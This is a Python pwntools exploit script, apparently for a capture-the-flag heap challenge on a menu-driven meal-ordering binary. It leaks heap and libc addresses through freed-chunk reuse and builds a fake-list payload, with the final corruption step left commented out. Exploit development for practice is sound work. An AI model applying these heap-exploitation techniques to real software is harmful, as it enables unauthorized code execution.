#!/usr/bin/env python3
from pwn import *
import os

# -------------------------------------------------
# setup
# -------------------------------------------------
path = args.BINARY or "./tc0"

exe = context.binary = ELF(path)
libc = ELF("./libc.so.6") if args.REMOTE else exe.libc
#  context.log_level = "debug"  # change to 'info' or 'error' if too noisy

HOST, PORT = "192.168.0.211", 1337
if os.getenv("container"):
    HOST = "host.containers.internal"
TOKEN = "e0474f5b11ef48439fec9f14c439c514"


def start():
    """
    Start the process locally, or connect remotely with:
      python exploit.py REMOTE
    """
    if args.REMOTE:
        io = remote(HOST, PORT)
        io.sendlineafter(b"please input hash value: ", TOKEN)
        io.sendlineafter(b"option :", b"4")
        return io
    else:
        return process(exe.path)


# -------------------------------------------------
# helpers for the menu
# -------------------------------------------------


def choose(io, payload: bytes):
    """
    Send a whole 'choice' blob after the main prompt.
    For simple choices, payload is just b'!' / b'@' / b'#' / b'$'.
    For the order option we stuff size+data right after '!' in one go.
    """
    io.sendafter(b"ready to order :", payload)


def make_order(io, size: int, data: bytes):
    """
    <!> Order a set meal

    Binary seems to:
      read(4) for size
      read(size) for details
    So we send: '!' + 4-byte size string + data
    """
    #  assert len(data) == size, "len(data) must equal size"

    size_str = f"{size:09d}".encode()  # e.g. 8 -> b'0008'

    choose(io, b"!xxx")
    io.sendafter(b"meal size : \n", size_str)
    io.sendafter(b"details : \n", data)


def cancel_order(io, idx: int | str):
    """
    <@> Cancel order
    Prompts with: 'Index :'
    """
    choose(io, b"@xxx")
    io.sendlineafter(b"Index :\n", str(idx).encode())


def show_order(io, idx: int | str):
    """
    <#> List order
    Prompts with: 'Index :'
    """
    choose(io, b"#xxx")
    io.sendlineafter(b"Index :\n", str(idx).encode())
    # You can now parse whatever it prints:
    # leak = io.recvuntil(b"+++++++++++++++++++++++++++++++", drop=True)
    # return leak


def goodbye(io):
    """
    <$> Goodbye !
    """
    choose(io, b"$xxx")


def recv(io):
    return io.recvuntil(b"+++++++++++++++++++++++++++++++", drop=True)


# -------------------------------------------------
# demo / main exploit skeleton
# -------------------------------------------------


def main():
    io = start()

    make_order(io, 0x18, b"\n")  # 0
    make_order(io, 0x18, b"\n")  # 1
    cancel_order(io, 1)
    make_order(io, 0x18, b"\n")  # 1

    show_order(io, 1)
    leak1 = u64(recv(io)[:-1].ljust(8, b"\0"))
    info(f"{leak1 = :#x}")

    make_order(io, 0x18, b"\n")  # 2
    cancel_order(io, 2)
    cancel_order(io, 1)
    make_order(io, 0x18, b"\n")  # 1

    show_order(io, 1)
    leak2 = u64(recv(io)[:-1].ljust(8, b"\0"))
    info(f"{leak2 = :#x}")

    heap_base = (leak2 ^ leak1) - 0x300
    info(f"{heap_base = :#x}")

    cancel_order(io, 1)

    make_order(io, 0x440, b"\n")  # 1
    make_order(io, 0x440, b"\n")  # 2
    make_order(io, 0x450, b"\n")  # 3
    cancel_order(io, 2)
    cancel_order(io, 1)

    make_order(io, 0x440, b"\n")  # 1

    show_order(io, 1)
    leak3 = u64(recv(io)[:-1].ljust(8, b"\0"))
    info(f"{leak3 = :#x}")

    libc.address = leak3 - 0x20400A
    info(f"{libc.address = :#x}")

    make_order(io, 0x440, b"\n")  # 2
    cancel_order(io, 3)
    cancel_order(io, 2)
    cancel_order(io, 1)
    cancel_order(io, 0)

    make_order(io, 0x18, b"\n")  # 0
    make_order(io, 0x18, b"\n")  # 1

    addr0 = heap_base + 0x2A0
    addr1 = heap_base + 0x2E0
    fake_list = heap_base + 0x360
    payload = flat(
        {
            0: [
                0xDEADBEEF,
                addr0,
                addr1,
                addr0,
            ],
        }
    )
    make_order(io, 0x440, payload)  # 2

    pause()
    #  cancel_order(io, (fake_list + 8 - exe.sym.list) // 8)

    pause()

    # exit cleanly
    goodbye(io)

    io.interactive()


if __name__ == "__main__":
    main()
